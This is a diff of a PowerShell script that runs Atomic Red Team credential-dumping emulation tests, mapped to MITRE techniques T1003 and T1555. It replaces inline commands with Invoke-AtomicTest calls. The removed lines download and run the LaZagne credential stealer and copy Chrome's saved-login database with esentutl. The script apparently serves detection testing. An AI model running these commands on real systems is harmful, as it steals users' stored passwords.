@@ -84,15 +84,13 @@ Invoke-AtomicTest T1003.001 -TestNumber 6
 Invoke-AtomicTest T1003.001 -TestNumber 1 -GetPrereqs
 Invoke-AtomicTest T1003.001 -TestNumber 1
 
-# Test 11 - T1003.001 - Dump Credentials using Lazagne
-echo "# Test 11 - T1003.001 - Dump Credentials using Lazagne"
-Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "c:\temp\Lazagne.exe"
-cmd.exe /c "c:\temp\Lazagne.exe" all
+# Atomic Test 11 - T1555.003 - Dump Credentials using Lazagne
+Invoke-AtomicTest T1555.003 -TestNumber 9 -GetPrereqs
+Invoke-AtomicTest T1555.003 -TestNumber 9
 
-# Test 12 - T1003.001 - Dump Credentials using esentutl.exe from Chrome 
-cmd.exe /Q /c esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "C:\temp\Login Data.tmp"
-if (Test-Path "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data") { Write-Host "Chrome Credentials existing, dump test possible." } else { Write-Host "no chrome credentials existing, test will fail." }
-if (Test-Path "C:\temp\Login Data.tmp") { Write-Host "Chrome Credential Dump successfull." } else { Write-Host "no chrome credential dump possible." }
+# Atomic Test 12 - T1555.003 - Dump Credentials using esentutl.exe from Chrome 
+Invoke-AtomicTest T1555.003 -TestNumber 17 -GetPrereqs
+Invoke-AtomicTest T1555.003 -TestNumber 17
 
 # Atomic Test #13 - T1003.005 - Cached Credential Dump via Cmdkey
 Invoke-AtomicTest T1003.005
